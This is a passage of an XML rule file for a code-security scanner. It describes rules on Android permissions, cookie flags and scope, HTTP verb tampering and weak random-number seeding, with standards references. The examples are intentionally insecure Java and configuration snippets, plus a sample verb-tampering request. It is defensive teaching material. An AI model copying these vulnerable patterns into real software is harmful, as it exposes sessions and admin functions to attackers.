																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 287</em> <br></p>
																									   <p>[11]  <em>Designing for Security</em> Android<br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[14]  <em>OWASP Top 10 Mobile Risks</em> OWASP<br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_android_bad_practices_normal_permission</key>
		<internalKey>Security Features/Android Bad Practices/normal Permission
		</internalKey>
		<name>Android Bad Practices: normal Permission</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program declares a permission with the <code>normal</code> protection level.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When declaring a custom permission, there are four options for specifying permission's protection level: <code>normal</code>, <code>dangerous</code>, <code>signature</code>, and <code>signature or system</code>. <code>Normal</code> permissions are granted to any application that requests them. <code>Dangerous</code> permissions are granted only after user confirmation. <code>Signature</code> permissions are granted only to applications signed by the same developer key as the package that defines the permission. <code>Signature or system</code> permissions are similar to <code>signature</code> permissions, but are also granted to packages in the Android system image.<br><br><b>Example 1:</b> Below is an example of a custom permission declared with the <code>normal</code> protection level.<br><br><pre> &lt;permission android:name="custom.PERMISSION"<br>                     android:label="@string/label_permission"<br>                     android:description="@string/desc_permission"<br>                     android:protectionLevel="normal"&gt;<br>      &lt;/permission&gt;</pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 265</em> <br></p>
																									   <p>[7] Jesse Burns <em>Developing Secure Mobile Applications for Android</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Improper Access Control - CWE ID 285</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[10]  <em>Permission Element</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 7.1.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 7.1.2</em> <br></p>
																									   <p>[14] William Enck, Machigar Ongtang, and Patrick McDaniel <em>Understanding Android Security</em> <br></p>
																									   <p>[15] William Enck and Patrick McDaniel <em>Understanding Android's Security Framework</em> <br></p>
																									   <p>[16]  <em>Using Permissions</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_cookie_security_cookie_not_sent_over_ssl</key>
		<internalKey>Security Features/Cookie Security/Cookie not Sent Over
			SSL
		</internalKey>
		<name>Cookie Security: Cookie not Sent Over SSL</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A cookie is created without the <code>secure</code> flag set to <code>true</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Modern web browsers support a <code>secure</code> flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.<br>  <br><br><b>Example 1:</b> In the example below, a cookie added to the response without setting the <code>secure</code> flag.<br><pre><br>	Cookie cookie = new Cookie("emailCookie", email);<br>	response.addCookie(cookie);<br></pre><br><br>If your application uses both HTTPS and HTTP but does not set the <code>secure</code> flag, cookies set during an HTTPS request will also be sent during subsequent HTTP requests. Sniffing network traffic over unencrypted wireless connections is a trivial task for attackers, so sending cookies (especially those with session IDs) over HTTP can result in application compromise.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Mike Perry <em>Automated HTTPS Cookie Hijacking</em> <br></p>
																									   <p>[11]  <em>Class Cookie</em> Sun Microsystems<br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 614</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_cookie_security_overly_broad_domain</key>
		<internalKey>Security Features/Cookie Security/Overly Broad Domain
		</internalKey>
		<name>Cookie Security: Overly Broad Domain</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A cookie with an overly broad domain opens an application to attacks through other applications.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Developers often set cookies to be active across a base domain like "<code>.example.com</code>". This exposes the cookie to all web applications on the base domain and any sub-domains. Since cookies often carry sensitive information such as session identifiers, sharing cookies across applications can lead a vulnerability in one application to cause a compromise in another.<br><br><b>Example 1:</b><br>Imagine you have a secure application deployed at <code>http://secure.example.com/</code> and the application sets a session ID cookie with domain "<code>.example.com</code>" when a user logs in.<br><br>For example:<br><pre><br>  Cookie cookie = new Cookie("sessionID", sessionID);<br>  cookie.setDomain(".example.com");<br></pre><br><br>Suppose you have another, less secure, application at <code>http://insecure.example.com/</code>, and it contains a cross-site scripting vulnerability. Any user authenticated to <code>http://secure.example.com</code> that browses to <code>http://insecure.example.com</code> risks exposing their session cookie from <code>http://secure.example.com</code>.<br><br>In addition to reading a cookie, it might be possible for attackers to perform a Cookie Poisoning attack by using <code>insecure.example.com</code> to create its own overly broad cookie that overwrites the cookie from <code>secure.example.com</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6]  <em>Class Cookie</em> Sun Microsystems<br></p>
																									   <p>[7] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_cookie_security_overly_broad_path</key>
		<internalKey>Security Features/Cookie Security/Overly Broad Path
		</internalKey>
		<name>Cookie Security: Overly Broad Path</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A cookie with an overly broad path can be accessed through other applications on the same domain.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Developers often set cookies to be accessible from the root context path ("<code>/</code>"). Doing so exposes the cookie to all web applications on the domain. Since cookies often carry sensitive information such as session identifiers, sharing cookies across applications can lead a vulnerability in one application to cause a compromise in another.<br><br>  <b>Example 1:</b><br>Imagine you have a forum application deployed at <code>http://communitypages.example.com/MyForum</code> and the application sets a session ID cookie with path "<code>/</code>" when users log in to the forum.<br><br>For example:<br><pre><br>  Cookie cookie = new Cookie("sessionID", sessionID);<br>  cookie.setPath("/");<br></pre><br><br>Suppose an attacker creates another application at <code>http://communitypages.example.com/EvilSite</code> and posts a link to this site on the forum. When a user of the forum clicks on the link, his browser will send the cookie set by <code>/MyForum</code> to the application running at <code>/EvilSite</code>. By stealing the session ID, the attacker is able to compromise the account of any forum user that browsed to <code>/EvilSite</code>.<br><br>In addition to reading a cookie, it might be possible for attackers to perform a Cookie Poisoning attack by using <code>/EvilSite</code> to create its own overly broad cookie that overwrites the cookie from <code>/MyForum</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[7] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_cookie_security_persistent_cookie</key>
		<internalKey>Security Features/Cookie Security/Persistent Cookie
		</internalKey>
		<name>Cookie Security: Persistent Cookie</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing sensitive data in a persistent cookie can lead to a breach of confidentiality or account compromise.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Most Web programming environments default to creating non-persistent cookies. These cookies reside only in browser memory (they are not written to disk) and are lost when the browser is closed. Programmers can specify that cookies be persisted across browser sessions until some future date. Such cookies are written to disk and survive across browser sessions and computer restarts.<br><br>If private information is stored in persistent cookies, attackers have a larger time window in which to steal this data - especially since persistent cookies are often set to expire in the distant future. Persistent cookies are often used to profile users as they interact with a site. Depending on what is done with this tracking data, it is possible to use persistent cookies to violate users' privacy.<br><br><br><b>Example:</b> The following code sets a cookie to expire in 10 years.<br><pre><br>	Cookie cookie = new Cookie("emailCookie", email);<br>	cookie.setMaxAge(60*60*24*365*10);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[10]  <em>Class Cookie</em> Sun Microsystems<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 539</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_http_verb_tampering</key>
		<internalKey>Security Features/HTTP Verb Tampering</internalKey>
		<name>HTTP Verb Tampering</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Security constraints that specify HTTP verbs often allow more access than intended.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An application's authentication and authorization mechanisms can be bypassed with HTTP verb tampering when:<br>1) It uses a security control that lists HTTP verbs.<br>2) The security control fails to block verbs that are not listed.<br>3) The application updates its state based on GET requests or other arbitrary HTTP verbs.<br><br><br><br>Most Java EE implementations allow HTTP methods that are not explicitly listed in the configuration. For example the following security constraint is applied to the HTTP GET method but not to other HTTP verbs:<br><br><pre><br>    &lt;security-constraint&gt;<br>        &lt;display-name&gt;Admin Constraint&lt;/display-name&gt;<br>        &lt;web-resource-collection&gt;<br>            &lt;web-resource-name&gt;Admin Area&lt;/web-resource-name&gt;<br>            &lt;url-pattern&gt;/pages/index.jsp&lt;/url-pattern&gt;<br>            &lt;url-pattern&gt;/admin/*.do&lt;/url-pattern&gt;<br>            &lt;http-method&gt;GET&lt;/http-method&gt;<br>            &lt;http-method&gt;POST&lt;/http-method&gt;<br>        &lt;/web-resource-collection&gt;<br>        &lt;auth-constraint&gt;<br>            &lt;description&gt;only admin&lt;/description&gt;<br>            &lt;role-name&gt;admin&lt;/role-name&gt;<br>        &lt;/auth-constraint&gt;<br>    &lt;/security-constraint&gt;<br></pre><br><br>Since verbs like HEAD are not explicitly defined in an <code>&lt;http-method&gt;</code> tag in this configuration, it might be possible to exercise administrative functionality by substituting GET or POST requests with HEAD requests. For HEAD requests to exercise administrative functionality, condition 3 must hold - the application must carry out commands based on verbs other than POST. Some web/application servers will accept arbitrary non-standard HTTP verbs and respond as if they were given a GET request. If that is the case, an attacker would be able to view administrative pages by using an arbitrary verb in a request.<br><br>For example, a typically client GET requests looks like:<br><pre><br>GET /admin/viewUsers.do HTTP/1.1<br>Host: www.example.com<br></pre><br><br>In an HTTP Verb Tampering attack, an attacker would substitute GET with something like FOO<br><pre><br>FOO /admin/viewUsers.do HTTP/1.1<br>Host: www.example.com<br></pre><br><br>At its core, this vulnerability is the result of an attempt to create a blacklist--a policy that specifies what users are not allowed to do. Blacklists rarely achieve their intended effect.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[5] Arshan Dabirsiaghi - Aspect Security <em>Bypassing Web Authentication and Authorization with HTTP Verb Tampering</em> <br></p>
																									   <p>[6] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 288</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_insecure_randomness</key>
		<internalKey>Security Features/Insecure Randomness</internalKey>
		<name>Insecure Randomness</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Standard pseudo-random number generators cannot withstand cryptographic attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context.<br><br>Computers are deterministic machines, and as such are unable to produce true randomness. Pseudo-Random Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.<br><br>There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and forms an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between it and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.<br><br><b>Example:</b> The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.<br><br><pre><br>String GenerateReceiptURL(String baseUrl) {<br>    Random ranGen = new Random();<br>    ranGen.setSeed((new Date()).getTime());<br>    return (baseUrl + ranGen.nextInt(400000000) + ".html");<br>}<br></pre><br><br>This code uses the <code>Random.nextInt()</code> function to generate "unique" identifiers for the receipt pages it generates. Because <code>Random.nextInt()</code> is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[9] J. Viega, G. McGraw <em>Building Secure Software</em> Addison-Wesley<br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 330</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[12]  <em>Java Cryptography Architecture</em> Sun Microsystems<br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 330</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.3, Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-13 Cryptographic Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_insecure_randomness_poor_seed</key>
		<internalKey>Security Features/Insecure Randomness/Poor Seed
		</internalKey>
		<name>Insecure Randomness: Poor Seed</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Random.setSeed should not be called with a constant integer argument.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Random.setSeed should not be called with a constant integer argument.  If a Random object is seeded with a specific value, the values returned by Random.nextInt() and similar methods which return or assign values are predictable.<br><br><b>Example:</b> Below, the values produced by the Random object <code>s</code> are predictable from the Random object <code>r</code>.<br><br><pre><br>        Random r = new Random();<br>        r.setSeed(12345);<br>        int i = r.nextInt();<br>        byte[] b = new byte[4];<br>        r.nextBytes(b);<br><br>        Random s = new Random();<br>        s.setSeed(12345);<br>        int j = s.nextInt();<br>        byte[] c = new byte[4];<br>        s.nextBytes(c);<br></pre><br><br>	In this example, Random objects <code>r</code> and <code>s</code> were identically seeded, so <code>i == j</code>, and corresponding values of arrays <code>b[]</code> and <code>c[]</code> are equal.<br>    
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.2 CAT II</em> <br></p>
